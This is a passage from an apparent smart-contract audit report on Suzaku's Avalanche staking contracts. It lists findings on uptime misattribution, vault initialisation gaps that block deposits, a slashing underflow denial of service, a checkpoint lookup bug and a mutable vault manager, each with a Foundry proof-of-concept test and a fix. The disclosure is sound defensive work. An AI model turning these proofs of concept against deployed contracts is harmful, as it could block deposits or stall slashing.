    uint64 constant TWO_HOURS = 2 * 60 * 60;
    uint64 constant THREE_HOURS = 3 * 60 * 60;
    uint64 constant ONE_HOUR = 1 * 60 * 60;
    uint64 constant FOUR_HOURS = 4 * 60 * 60;
    uint64 constant FIVE_HOURS = 5 * 60 * 60;
    uint64 constant SEVEN_HOURS = 7 * 60 * 60;
    uint64 constant SIX_HOURS = 6 * 60 * 60;
    uint64 constant TWELVE_HOURS = 12 * 60 * 60;
    uint64 constant ZERO_HOURS = 0;

    // Hardcoded full node IDs based on previous test traces/deterministic generation
    // These values MUST match what operatorNodes would be in UptimeTrackerTest.setUp()
    // from your MockAvalancheL1Middleware.
    // If MockAvalancheL1Middleware changes its node generation, these must be updated.
    bytes32 constant OP_NODE_0_FULL = 0xe917244df122a1996142a1cd6c7269c136c20f47acd1ff079ee7247cae2f45c5;
    bytes32 constant OP_NODE_1_FULL = 0x69e183f32216866f48b0c092f70d99378e18023f7185e52eeee2f5bbd5255293;
    bytes32 constant OP_NODE_2_FULL = 0xfcc09d5775472c6fa988b216f5ce189894c14e093527f732b9b65da0880b5f81;

    // Constructor is now empty as we are not storing operatorNodes passed from test.
    // constructor() {} // Can be omitted for an empty constructor

    function getDerivedValidationID(bytes32 fullNodeID) internal pure returns (bytes32) {
        // Corrected conversion: bytes32 -> uint256 -> uint160 -> uint256 -> bytes32
        return bytes32(uint256(uint160(uint256(fullNodeID))));
    }

    function getVerifiedWarpMessage(
        uint32 messageIndex
    ) external view override returns (WarpMessage memory, bool) {
        // The 'require' for _operatorNodes.length is removed.

        bytes32 derivedNode0ID = getDerivedValidationID(OP_NODE_0_FULL);
        bytes32 derivedNode1ID = getDerivedValidationID(OP_NODE_1_FULL);
        bytes32 derivedNode2ID = getDerivedValidationID(OP_NODE_2_FULL);
        bytes memory payload;

        // test_ComputeValidatorUptime & test_ValidatorUptimeEvent
        if (messageIndex == 0) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, TWO_HOURS);
        } else if (messageIndex == 1) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, THREE_HOURS);
        }
        // test_ComputeOperatorUptime - first epoch (0) & test_OperatorUptimeEvent
        else if (messageIndex == 2) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, TWO_HOURS);
        } else if (messageIndex == 3) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode1ID, THREE_HOURS);
        } else if (messageIndex == 4) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode2ID, ONE_HOUR);
        }
        // test_ComputeOperatorUptime - second epoch (1)
        else if (messageIndex == 5) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, FOUR_HOURS);
        } else if (messageIndex == 6) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode1ID, FOUR_HOURS);
        } else if (messageIndex == 7) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode2ID, FOUR_HOURS);
        }
        // test_ComputeOperatorUptime - third epoch (2)
        else if (messageIndex == 8) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, FIVE_HOURS);
        } else if (messageIndex == 9) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode1ID, SEVEN_HOURS);
        } else if (messageIndex == 10) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode2ID, SIX_HOURS);
        }
        // test_EdgeCases
        else if (messageIndex == 11) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, FOUR_HOURS); // EPOCH_DURATION
        } else if (messageIndex == 12) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode1ID, ZERO_HOURS);
        } else if (messageIndex == 13) {
            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, TWELVE_HOURS); // 3 * EPOCH_DURATION
+        } else if (messageIndex == 14) {
+            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, ZERO_HOURS);
+        } else if (messageIndex == 15) {
+            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode2ID, ZERO_HOURS);
+        } else if (messageIndex == 16) {
+            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode0ID, FOUR_HOURS);
+        } else if (messageIndex == 17) {
+            payload = ValidatorMessages.packValidationUptimeMessage(derivedNode2ID, FOUR_HOURS);
        } else {
            return (WarpMessage({sourceChainID: bytes32(uint256(1)), originSenderAddress: address(0), payload: new bytes(0)}), false);
        }

        return (
            WarpMessage({
                sourceChainID: bytes32(uint256(1)),
                originSenderAddress: address(0),
                payload: payload
            }),
            true
        );
    }

    function sendWarpMessage(
        bytes memory // message
    ) external pure override returns (bytes32) { // messageID
        return bytes32(0);
    }

    function getBlockchainID() external pure override returns (bytes32) {
        return bytes32(uint256(1));
    }

    function getVerifiedWarpBlockHash(
        uint32 // messageIndex
    ) external pure override returns (WarpBlockHash memory warpBlockHash, bool valid) {
        warpBlockHash = WarpBlockHash({sourceChainID: bytes32(uint256(1)), blockHash: bytes32(0)});
        valid = true;
    }
}
```

2. Update the `UptimeTrackerTest.t.sol` file:
```diff
// SPDX-License-Identifier: MIT
// SPDX-FileCopyrightText: Copyright 2024 ADDPHO
pragma solidity 0.8.25;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {UptimeTracker} from "../../src/contracts/rewards/UptimeTracker.sol";
import {IUptimeTracker, LastUptimeCheckpoint} from "../../src/interfaces/rewards/IUptimeTracker.sol";
import {ValidatorMessages} from "@avalabs/icm-contracts/validator-manager/ValidatorMessages.sol";
import {MockAvalancheL1Middleware} from "../mocks/MockAvalancheL1Middleware.sol";
import {MockBalancerValidatorManager} from "../mocks/MockBalancerValidatorManager2.sol";
import {MockWarpMessenger} from "../mocks/MockWarpMessenger.sol";
import {WarpMessage, IWarpMessenger} from "@avalabs/subnet-evm-contracts@1.2.0/contracts/interfaces/IWarpMessenger.sol";
import {Rewards} from "../../src/contracts/rewards/Rewards.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract UptimeTrackerTest is Test {
    UptimeTracker public uptimeTracker;
    MockBalancerValidatorManager public validatorManager;
    MockAvalancheL1Middleware public middleware;
    MockWarpMessenger public warpMessenger;
+    Rewards public rewards;
+    ERC20Mock public rewardsToken;

    address public operator;
    bytes32[] public operatorNodes;
    uint48 constant EPOCH_DURATION = 4 hours;
    address constant WARP_MESSENGER_ADDR = 0x0200000000000000000000000000000000000005;
    bytes32 constant L1_CHAIN_ID = bytes32(uint256(1));
+    address constant ADMIN = address(0x1);
+    address constant REWARDS_DISTRIBUTOR = address(0x2);

    event ValidatorUptimeComputed(bytes32 indexed validationID, uint48 indexed firstEpoch, uint256 uptimeSecondsAdded, uint256 numberOfEpochs);
    event OperatorUptimeComputed(address indexed operator, uint48 indexed epoch, uint256 uptime);

    function getDerivedValidationID(bytes32 fullNodeID) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(uint256(fullNodeID))));
    }

    function setUp() public {
        uint256[] memory nodesPerOperator = new uint256[](1);
        nodesPerOperator[0] = 3;

        validatorManager = new MockBalancerValidatorManager();
        middleware = new MockAvalancheL1Middleware(1, nodesPerOperator, address(validatorManager), address(0));
        uptimeTracker = new UptimeTracker(payable(address(middleware)), L1_CHAIN_ID);

        operator = middleware.getAllOperators()[0];
        operatorNodes = middleware.getActiveNodesForEpoch(operator, 0);

        warpMessenger = new MockWarpMessenger();
        vm.etch(WARP_MESSENGER_ADDR, address(warpMessenger).code);

+        rewards = new Rewards();
+        rewards.initialize(
+            ADMIN,
+            ADMIN,
+            payable(address(middleware)),
+            address(uptimeTracker),
+            1000, // protocolFee
+            2000, // operatorFee
+            1000, // curatorFee
+            11_520 // minRequiredUptime
+        );
+        vm.prank(ADMIN);
+        rewards.setRewardsDistributorRole(REWARDS_DISTRIBUTOR);

+        rewardsToken = new ERC20Mock();
+        rewardsToken.mint(REWARDS_DISTRIBUTOR, 1_000_000 * 10**18);
+        vm.prank(REWARDS_DISTRIBUTOR);
+        rewardsToken.approve(address(rewards), 1_000_000 * 10**18);
    }

	...
}
```

3. Add the following test to the `UptimeTrackerTest.t.sol` file:
```solidity
function test_IncorrectUptimeDistributionWithRewards() public {
	bytes32 derivedNode1ID = getDerivedValidationID(operatorNodes[1]);

	// Warp to epoch 1
	vm.warp(EPOCH_DURATION + 1);
	uptimeTracker.computeValidatorUptime(14); // uptime = 0 hours, node 0
	uptimeTracker.computeValidatorUptime(12); // uptime = 0 hours, node 1
	uptimeTracker.computeValidatorUptime(15); // uptime = 0 hours, node 2

	// Warp to epoch 3
	vm.warp(3 * EPOCH_DURATION + 1);
	uptimeTracker.computeValidatorUptime(16); // uptime = 4 hours, node 0
	uptimeTracker.computeValidatorUptime(6); // uptime = 4 hours, node 1
	uptimeTracker.computeValidatorUptime(17); // uptime = 4 hours, node 2

	// Check uptime distribution
	uint256 uptimeEpoch1 = uptimeTracker.validatorUptimePerEpoch(1, derivedNode1ID);
	uint256 uptimeEpoch2 = uptimeTracker.validatorUptimePerEpoch(2, derivedNode1ID);
	assertEq(uptimeEpoch1, 2 * 3600, "Epoch 1 uptime should be 2 hours");
	assertEq(uptimeEpoch2, 2 * 3600, "Epoch 2 uptime should be 2 hours");

	// Set different rewards for epochs 1 and 2
	uint48 startEpoch = 1;
	uint256 rewardsAmountEpoch1 = 10000 * 10**18;
	uint256 rewardsAmountEpoch2 = 20000 * 10**18;

	vm.startPrank(REWARDS_DISTRIBUTOR);
	rewards.setRewardsAmountForEpochs(startEpoch, 1, address(rewardsToken), rewardsAmountEpoch1);
	rewards.setRewardsAmountForEpochs(startEpoch + 1, 1, address(rewardsToken), rewardsAmountEpoch2);

	// Compute operator uptime
	uptimeTracker.computeOperatorUptimeAt(operator, 1);
	uptimeTracker.computeOperatorUptimeAt(operator, 2);

	// Distribute rewards
	vm.warp(5 * EPOCH_DURATION + 1);
	rewards.distributeRewards(1, 10);
	rewards.distributeRewards(2, 10);
	vm.stopPrank();

	// Set stakes for simplicity (assume operator has full stake)
	uint256 totalStake = 1000 * 10**18;
	middleware.setTotalStakeCache(1, 1, totalStake);
	middleware.setTotalStakeCache(2, 1, totalStake);
	middleware.setOperatorStake(1, operator, 1, totalStake);
	middleware.setOperatorStake(2, operator, 1, totalStake);

	vm.prank(ADMIN);
	rewards.setRewardsShareForAssetClass(1, 10000); // 100%
	vm.stopPrank();

	// Calculate expected rewards (active only in epoch 2)
	uint256 expectedUptimeEpoch1 = 0;
	uint256 expectedUptimeEpoch2 = 4 * 3600;
	uint256 totalUptimePerEpoch = 4 * 3600;
	uint256 expectedRewardsEpoch1 = (expectedUptimeEpoch1 * rewardsAmountEpoch1) / totalUptimePerEpoch;
	uint256 expectedRewardsEpoch2 = (expectedUptimeEpoch2 * rewardsAmountEpoch2) / totalUptimePerEpoch;
	uint256 totalExpectedRewards = expectedRewardsEpoch1 + expectedRewardsEpoch2;

	// Calculate actual rewards
	uint256 actualUptimeEpoch1 = uptimeEpoch1;
	uint256 actualUptimeEpoch2 = uptimeEpoch2;
	uint256 totalActualUptimePerEpoch = actualUptimeEpoch1 + actualUptimeEpoch2;
	uint256 actualRewardsEpoch1 = (actualUptimeEpoch1 * rewardsAmountEpoch1) / totalActualUptimePerEpoch;
	uint256 actualRewardsEpoch2 = (actualUptimeEpoch2 * rewardsAmountEpoch2) / totalActualUptimePerEpoch;
	uint256 totalActualRewards = actualRewardsEpoch1 + actualRewardsEpoch2;

	// Assert the discrepancy
	assertEq(totalActualUptimePerEpoch, totalUptimePerEpoch, "Total uptime in both cases is the same");
	assertLt(totalActualRewards, totalExpectedRewards, "Validator receives fewer rewards due to incorrect uptime distribution");
}
```

**Recommended Mitigation:** To resolve this vulnerability and ensure accurate uptime tracking and reward distribution, the following measures are recommended:

1. **Refine Uptime Attribution Logic:**
   Update the `computeValidatorUptime` function to attribute uptime only to epochs where the validator was confirmed active. This could involve cross-referencing validator activity logs or status flags to validate participation in each epoch.

2. **Implement Epoch-Specific Uptime Tracking:**
   Modify the contract to record and calculate uptime individually for each epoch, based on the validators actual activity during that period. While this may require more detailed data storage, it ensures precision in uptime attribution.

3. **Integrate with Validator Activity Data:**
   If possible, connect the contract to external sources (e.g., oracles or on-chain activity records) that provide real-time or historical data on validator status. This would enable the system to accurately determine when a validator was active.

By applying these mitigations, the platform can achieve accurate uptime tracking, ensure fair reward distribution, and maintain trust among validators and users.

**Suzaku:**
Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage
## Medium Risk


### Vault initialization allows deposit whitelist with no management capability

**Description:** The `VaultTokenized` contract can be initialized with deposit whitelist enabled but without any ability to add addresses to the whitelist. This creates a state where deposits are restricted to whitelisted addresses, but no addresses can be whitelisted, effectively blocking all deposits.

The issue occurs in the initialization validation logic that checks for role consistency:

```solidity
// File: VaultTokenized.sol
function _initialize(uint64, /* initialVersion */ address, /* owner */ bytes memory data) internal onlyInitializing {
    VaultStorageStruct storage vs = _vaultStorage();
    (InitParams memory params) = abi.decode(data, (InitParams));
    // [...truncated for brevity...]

    if (params.defaultAdminRoleHolder == address(0)) {
        if (params.depositWhitelistSetRoleHolder == address(0)) {
            if (params.depositWhitelist) {
                if (params.depositorWhitelistRoleHolder == address(0)) {
                    revert Vault__MissingRoles();
                }
            } else if (params.depositorWhitelistRoleHolder != address(0)) {
                revert Vault__InconsistentRoles();
            }
        }
        // [...code...]
    }
    // [...code...]
}
```
The vulnerability exists because the validation for ensuring consistent whitelist management only occurs when `params.depositWhitelistSetRoleHolder == address(0)`. If caller sets a `depositWhitelistSetRoleHolder` (who can toggle whitelist on/off) but doesn't set a `depositorWhitelistRoleHolder` (who can add addresses to the whitelist), the validation is bypassed completely.

This gap allows a vault to be created with:

- `depositWhitelist = true` (whitelist enabled)
- `depositWhitelistSetRoleHolder = someAddress` (someone can toggle the whitelist)
- `depositorWhitelistRoleHolder = address(0)` (no one can add addresses to the whitelist)


**Impact:** When a vault is initialized in this state:

- Deposits are restricted to whitelisted addresses only
- No one has the ability to add addresses to the whitelist
- No deposits can be made until whitelist is disabled completely
- The only recourse is to use the depositWhitelistSetRoleHolder to turn off whitelist entirely

**Proof of Concept:** Add following to `vaultTokenizedTest.t.sol`

```solidity
     // This demonstrates that when the vault is created with depositWhitelist=true
     // and depositWhitelistSetRoleHolder set but depositorWhitelistRoleHolder NOT set,
     // no deposits can be made until whitelist is turned off, because no one can add
     // addresses to the whitelist.
    function test_WhitelistInconsistency() public {
        // Create a vault with whitelisting enabled but no way to add addresses to the whitelist
        uint64 lastVersion = vaultFactory.lastVersion();

        // configuration:
        // 1. depositWhitelist = true (whitelist is enabled)
        // 2. depositWhitelistSetRoleHolder = alice (someone can toggle whitelist)
        // 3. depositorWhitelistRoleHolder = address(0) (no one can add to whitelist)
        address vaultAddress = vaultFactory.create(
            lastVersion,
            alice,
            abi.encode(
                IVaultTokenized.InitParams({
                    collateral: address(collateral),
                    burner: address(0xdEaD),
                    epochDuration: 7 days,
                    depositWhitelist: true, // Whitelist ENABLED
                    isDepositLimit: false,
                    depositLimit: 0,
                    defaultAdminRoleHolder: address(0), // No default admin
                    depositWhitelistSetRoleHolder: alice, // Alice can toggle whitelist
                    depositorWhitelistRoleHolder: address(0), // No one can add to whitelist
                    isDepositLimitSetRoleHolder: alice,
                    depositLimitSetRoleHolder: alice,
                    name: "Test",
                    symbol: "TEST"
                })
            ),
            address(delegatorFactory),
            address(slasherFactory)
        );

        vault = VaultTokenized(vaultAddress);

        assertEq(vault.depositWhitelist(), true);
        assertEq(vault.hasRole(vault.DEPOSIT_WHITELIST_SET_ROLE(), alice), true);
        assertEq(vault.hasRole(vault.DEPOSITOR_WHITELIST_ROLE(), address(0)), false);
        assertEq(vault.isDepositorWhitelisted(alice), false);
        assertEq(vault.isDepositorWhitelisted(bob), false);

        // Step 1: Try to make a deposit as bob - should fail because whitelist is on
        // and bob is not whitelisted
        collateral.transfer(bob, 100 ether);
        vm.startPrank(bob);
        collateral.approve(address(vault), 100 ether);
        vm.expectRevert(IVaultTokenized.Vault__NotWhitelistedDepositor.selector);
        vault.deposit(bob, 100 ether);
        vm.stopPrank();

        // Step 2: Alice tries to add bob to the whitelist - should fail because
        // she has the role to toggle whitelist but not to add addresses to it
        vm.startPrank(alice);
        vm.expectRevert(); // Access control error (alice doesn't have DEPOSITOR_WHITELIST_ROLE)
        vault.setDepositorWhitelistStatus(bob, true);
        vm.stopPrank();

        // Step 3: Alice tries to turn off whitelist (which she can do)
        vm.startPrank(alice);
        vault.setDepositWhitelist(false);
        vm.stopPrank();

        // Step 4: Now bob should be able to deposit
        vm.startPrank(bob);
        vault.deposit(bob, 100 ether);
        vm.stopPrank();

        // Verify final state
        assertEq(vault.activeBalanceOf(bob), 100 ether);
    }
```

**Recommended Mitigation:** Consider modifying the initialization validation logic to check for the consistency of whitelist configuration regardless of whether `depositWhitelistSetRoleHolder` is set.

```solidity
if (params.defaultAdminRoleHolder == address(0)) {
    if (params.depositWhitelist && params.depositorWhitelistRoleHolder == address(0)) {
        revert Vault__MissingRoles();
    }

    if (!params.depositWhitelist && params.depositorWhitelistRoleHolder != address(0)) {
        revert Vault__InconsistentRoles();
    }
     // [...code...]

}
```


**Suzaku:**
Fixed in commit [6b7f870](https://github.com/suzaku-network/suzaku-core/pull/155/commits/6b7f87075ae366f95fb2ebad4875f2802961799c).

**Cyfrin:** Verified.


### Vault initialization allows zero deposit limit with no ability to modify causing denial of service

**Description:** The `VaultTokenized` contract's initialization procedure allows a vault to be created with deposit limit feature enabled at a value of zero, but without any ability to change this limit. This creates a state where all deposits are effectively blocked, as the limit is set to zero, and no role exists to modify this limit.

The issue occurs in the initialization validation logic that checks for role consistency:

```solidity
// File: VaultTokenized.sol
function _initialize(uint64, /* initialVersion */ address, /* owner */ bytes memory data) internal onlyInitializing {
    VaultStorageStruct storage vs = _vaultStorage();
    (InitParams memory params) = abi.decode(data, (InitParams));
    // [...code...]

    if (params.defaultAdminRoleHolder == address(0)) {
        // [...code...]

        if (params.isDepositLimitSetRoleHolder == address(0)) { //@audit check only happens when deposit limit set holder is zero address
            if (params.isDepositLimit) {
                if (params.depositLimit == 0 && params.depositLimitSetRoleHolder == address(0)) {
                    revert Vault__MissingRoles();
                }
            } else if (params.depositLimit != 0 || params.depositLimitSetRoleHolder != address(0)) {
                revert Vault__InconsistentRoles();
            }
        }
    }
    // [...code...]
}
```
The vulnerability exists because the validation for ensuring a consistent deposit limit configuration only occurs when `params.isDepositLimitSetRoleHolder == address(0)`. If someone sets an `isDepositLimitSetRoleHolder` (who can toggle deposit limit on/off) but doesn't set a `depositLimitSetRoleHolder` (who can modify the limit value) while setting `depositLimit = 0`, the validation is bypassed completely.

This gap allows a vault to be created with:

- `isDepositLimit = true` (deposit limit enabled)
- `depositLimit = 0` (no deposits allowed)
- `isDepositLimitSetRoleHolder = someAddress` (someone can toggle the limit feature)
- `depositLimitSetRoleHolder = address(0)` (no one can modify the limit value)

**Impact:** When a vault is initialized in this state:

- Deposits are limited to a maximum of 0 (effectively blocking all deposits)
- No one has the ability to change the deposit limit
- No deposits can be made until the deposit limit feature is disabled completely
- The only recourse is to use the isDepositLimitSetRoleHolder to turn off the deposit limit feature entirely

This could lead to denial of service for vault deposits, especially if the vault design assumes that limit management would be available when the deposit limit feature is enabled.

**Proof of Concept:** Add following to `vaultTokenizedTest.t.sol`
```solidity
  // This demonstrates that when the vault is created with isDepositLimitSetRoleHolder
    // set but depositLimitSetRoleHolder NOT set,
    // deposit limit is enabled but no one can set the limit.
    function test_DepositLimitInconsistency() public {
        // Create a vault with deposit limit enabled but no way to change the limit
        uint64 lastVersion = vaultFactory.lastVersion();

        // configuration:
        // 1. isDepositLimit = true (deposit limit is enabled)
        // 2. depositLimit = 0 (zero limit)
        // 3. isDepositLimitSetRoleHolder = alice (alice can toggle the feature)
        // 4. depositLimitSetRoleHolder = address(0) (no one can set the limit)
        address vaultAddress = vaultFactory.create(
            lastVersion,
            alice,
            abi.encode(
                IVaultTokenized.InitParams({
                    collateral: address(collateral),
                    burner: address(0xdEaD),
                    epochDuration: 7 days,
                    depositWhitelist: false,
                    isDepositLimit: true, // Deposit limit ENABLED
                    depositLimit: 0, // Zero limit
                    defaultAdminRoleHolder: address(0), // No default admin
                    depositWhitelistSetRoleHolder: alice,
                    depositorWhitelistRoleHolder: alice,
                    isDepositLimitSetRoleHolder: alice, // Alice can toggle limit feature
                    depositLimitSetRoleHolder: address(0), // No one can set the limit
                    name: "Test",
                    symbol: "TEST"
                })
            ),
            address(delegatorFactory),
            address(slasherFactory)
        );

        vault = VaultTokenized(vaultAddress);

        // Verify initial state
        assertEq(vault.isDepositLimit(), true);
        assertEq(vault.depositLimit(), 0);
        assertEq(vault.hasRole(vault.IS_DEPOSIT_LIMIT_SET_ROLE(), alice), true);
        assertEq(vault.hasRole(vault.DEPOSIT_LIMIT_SET_ROLE(), address(0)), false);

        // Step 1: Try to make a deposit - should fail because limit is 0
        collateral.transfer(bob, 100 ether);
        vm.startPrank(bob);
        collateral.approve(address(vault), 100 ether);
        vm.expectRevert(IVaultTokenized.Vault__DepositLimitReached.selector);
        vault.deposit(bob, 100 ether);
        vm.stopPrank();

        // Step 2: Alice tries to set a deposit limit - should fail because
        // she can toggle the feature but not set the limit
        vm.startPrank(alice);
        vm.expectRevert(); // Access control error
        vault.setDepositLimit(1000 ether);
        vm.stopPrank();

        // Step 3: Alice turns off the deposit limit feature
        vm.startPrank(alice);
        vault.setIsDepositLimit(false);
        vm.stopPrank();

        // Step 4: Now bob should be able to deposit
        vm.startPrank(bob);
        vault.deposit(bob, 100 ether);
        vm.stopPrank();

        // Verify final state
        assertEq(vault.activeBalanceOf(bob), 100 ether);
    }
```

**Recommended Mitigation:** Consider modifying the initialization validation logic to check for the consistency of deposit limit configuration regardless of whether `isDepositLimitSetRoleHolder` is set.

```solidity
if (params.defaultAdminRoleHolder == address(0)) {
    // [...whitelist code...]

    if (params.isDepositLimit && params.depositLimit == 0 && params.depositLimitSetRoleHolder == address(0)) {
        revert Vault__MissingRoles();
    }

    if (!params.isDepositLimit && (params.depositLimit != 0 || params.depositLimitSetRoleHolder != address(0))) {
        revert Vault__InconsistentRoles();
    }
}
```

**Suzaku:**
Fixed in commit [6b7f870](https://github.com/suzaku-network/suzaku-core/pull/155/commits/6b7f87075ae366f95fb2ebad4875f2802961799c).

**Cyfrin:** Verified.



### Potential underflow in slashing logic

**Description:** The `VaultTokenized::onSlash` uses a cascading slashing logic when handling scenarios where the calculated `withdrawalsSlashed` exceeds available `withdrawals_`. In such cases, the excess amount is added to `nextWithdrawalsSlashed` without checking if `nextWithdrawals` can absorb this additional slashing amount.

In the code snippet below

```solidity
// In the slashing logic for the previous epoch case
if (withdrawals_ < withdrawalsSlashed) {
    nextWithdrawalsSlashed += withdrawalsSlashed - withdrawals_;
    withdrawalsSlashed = withdrawals_;
}

// Later, this could underflow if nextWithdrawalsSlashed > nextWithdrawals
vs.withdrawals[currentEpoch_ + 1] = nextWithdrawals - nextWithdrawalsSlashed; //@audit this is adjusted without checking if nextWithdrawalsSlashed <= nextWithdrawals
```
Due to rounding in integer arithmetic and the fact that `withdrawalsSlashed` is calculated as a remainder `(slashedAmount - activeSlashed - nextWithdrawalsSlashed)`, it's possible for `withdrawalsSlashed` to exceed `withdrawals_` in normal proportional distribution. This causes excess slashing to cascade to `nextWithdrawalsSlashed`.

If `nextWithdrawals` is zero or less than the adjusted `nextWithdrawalsSlashed`, the operation `nextWithdrawals - nextWithdrawalsSlashed` would underflow, causing the transaction to revert, effectively creating a Denial of Service (DoS) in the slashing mechanism.

**Impact:** The slashing transaction will revert, preventing any slashing from occurring in affected scenarios. In certain specific scenarios, malicious actors can engineer this scenario to prevent slashing.

The likelihood of this occurring naturally increases when:

- Future withdrawals are minimal or zero
- Slashing amounts are close to total available stake
- Rounding effects in integer arithmetic become significant

**Proof of Concept:** Consider following scenario:

```text
activeStake_ = 99
withdrawals_ = 3
nextWithdrawals = 0
slashableStake = 102
slashedAmount = 102

Calculation with rounding down:

activeSlashed = floor(102 * 99 / 102) = 98 (rounding down from 98.97)
nextWithdrawalsSlashed = 0
withdrawalsSlashed = 102 - 98 - 0 = 4
withdrawalsSlashed (4) > withdrawals_ (3)

The final operation nextWithdrawals (0) - nextWithdrawalsSlashed (1) causes underflow.
```

**Recommended Mitigation:** Consider adding an explicit check to handle the case where `nextWithdrawalsSlashed` exceeds `nextWithdrawals`. This change will prevent the underflow condition and ensure the slashing mechanism remains operational under all circumstances.


**Suzaku:**
Fixed in commit [98bd130](https://github.com/suzaku-network/suzaku-core/pull/155/commits/98bd13087f37a85a1e563b9ca8e12c4fab090615).

**Cyfrin:** Verified.


### Wrong value is returned in `upperLookupRecentCheckpoint`

**Description:** In `Checkpoint::upperLookupRecentCheckpoint`  function is designed to check if there exists a checkpoint with a key less than or equal to the provided search key in the structure (i.e., the structure is not empty). If such a checkpoint exists, it returns the key, value, and position of the checkpoint in the trace.
However, the function behaves incorrectly when a valid hint is provided, which contradicts its intended purpose.

This comes from the fact that `at` is returning the correct value.

```solidity
function at(Trace256 storage self, uint32 pos) internal view returns (Checkpoint256 memory) {
        OZCheckpoints.Checkpoint208 memory checkpoint = self._trace.at(pos);
        return Checkpoint256({_key: checkpoint._key, _value: self._values[checkpoint._value]});
    }
```

**Impact:** The incorrect handling of the checkpoint value in `upperLookupRecentCheckpoint` can cause the function to revert or return an incorrect value, undermining the reliability of the checkpoint lookup mechanism.

**Proof of Concept:** Run the following test

```solidity
contract CheckpointsBugTest is Test {
    using ExtendedCheckpoints for ExtendedCheckpoints.Trace256;

    ExtendedCheckpoints.Trace256 internal trace;

    function setUp() public {
        // Initialize the trace with some checkpoints
        trace.push(100, 1000); // timestamp 100, value 1000
        trace.push(200, 2000); // timestamp 200, value 2000
        trace.push(300, 3000); // timestamp 300, value 3000
    }

    function test_upperLookupRecentCheckpoint_withoutHint_works() public view {
        // Test without hint - this should work correctly
        (bool exists, uint48 key, uint256 value, uint32 pos) = trace.upperLookupRecentCheckpoint(150);

        assertTrue(exists, "Checkpoint should exist");
        assertEq(key, 100, "Key should be 100");
        assertEq(value, 1000, "Value should be 1000");
        assertEq(pos, 0, "Position should be 0");
    }

    // This test demonstrates the bug when using a valid hint
    function test_upperLookupRecentCheckpoint_withValidHint_demonstratesBug() public {

        // First, let's get the correct hint (position 0)
        uint32 validHint = 0;
        bytes memory hintBytes = abi.encode(validHint);

        // Call with hint - this will fail due to the bug
        vm.expectRevert(); // Expecting a revert due to array bounds error
        trace.upperLookupRecentCheckpoint(150, hintBytes);
    }

}
```

**Recommended Mitigation:** Modify the `upperLookupRecentCheckpoint` function to directly use the `checkpoint._value` returned by the at function, rather than referencing `self._values[checkpoint._value]`. The proposed change is as follows:

```diff
function upperLookupRecentCheckpoint(
        Trace256 storage self,
        uint48 key,
        bytes memory hint_
    ) internal view returns (bool, uint48, uint256, uint32) {
        if (hint_.length == 0) {
            return upperLookupRecentCheckpoint(self, key);
        }
        uint32 hint = abi.decode(hint_, (uint32));
        Checkpoint256 memory checkpoint = at(self, hint);
        if (checkpoint._key == key) {
-           return (true, checkpoint._key, self._values[checkpoint._value], hint);
+           return (true, checkpoint._key, checkpoint._value, hint);
        }
        if (checkpoint._key < key && (hint == length(self) - 1 || at(self, hint + 1)._key > key)) {
-            return (true, checkpoint._key, self._values[checkpoint._value], hint);
+            return (true, checkpoint._key, checkpoint._value, hint);
        }
        return upperLookupRecentCheckpoint(self, key);
```

**Suzaku:**
Fixed in commit [d198969](https://github.com/suzaku-network/suzaku-core/pull/155/commits/d198969910088d087cd52d2a6bad15fe2530df9c).

**Cyfrin:** Verified.




### Inconsistent stake calculation due to mutable `vaultManager` reference in `AvalancheL1Middleware`

**Description**

The `AvalancheL1Middleware` contract permits updating the `vaultManager` reference. However, doing so can introduce **critical inconsistencies** in logic that depends on stateful or historical data tied to the original `vaultManager`. Key issues include:

* **Vaults registered in the original manager are not migrated** to the new one.
* **Time-based metadata** like `enabledTime` and `disabledTime` resets upon re-registration, misaligning historical activity.
* Core logic in `getOperatorStake()` depends on `_wasActiveAt()`, which checks whether a vault was active during a given epoch.
* Replacing the `vaultManager` disrupts this check, leading to:

  * Ignored historical stakes
  * Miscounted or missed vaults
  * Incorrect stake attribution

This breaks key protocol guarantees across the middleware and compromises correctness in systems like staking(node creation) and rewards.

**Illustrative Flow**

1. Register vault `V1` in the original `vaultManager`.
2. Replace with `vaultManagerV2` via `setVaultManager()`.
3. Re-register `V1` in `vaultManagerV2`  note: `enabledTime` is reset.
4. Query `getOperatorStake()` for an epoch before re-registration.
5. `_wasActiveAt()` returns `false`, excluding the stake.

**Impact**

* **Data Inconsistency**: `getOperatorStake()` may return incorrect values.
* **Broken Epoch Tracking**: Epoch-based logic dependent on vault state (like `_wasActiveAt`) becomes unreliable.

**Proof of Concept**

```solidity
    function test_changeVaultManager() public {
        // Move forward to let the vault roll epochs
        uint48 epoch = _calcAndWarpOneEpoch();

        uint256 operatorStake = middleware.getOperatorStake(alice, epoch, assetClassId);
        console2.log("Operator stake (epoch", epoch, "):", operatorStake);
        assertGt(operatorStake, 0);

        MiddlewareVaultManager vaultManager2 = new MiddlewareVaultManager(address(vaultFactory), owner, address(middleware));

        vm.startPrank(validatorManagerAddress);
        middleware.setVaultManager(address(vaultManager2));
        vm.stopPrank();

        uint256 operatorStake2 = middleware.getOperatorStake(alice, epoch, assetClassId);
        console2.log("Operator stake (epoch", epoch, "):", operatorStake2);
        assertEq(operatorStake2, 0);
    }

```

**Recommended Mitigation**

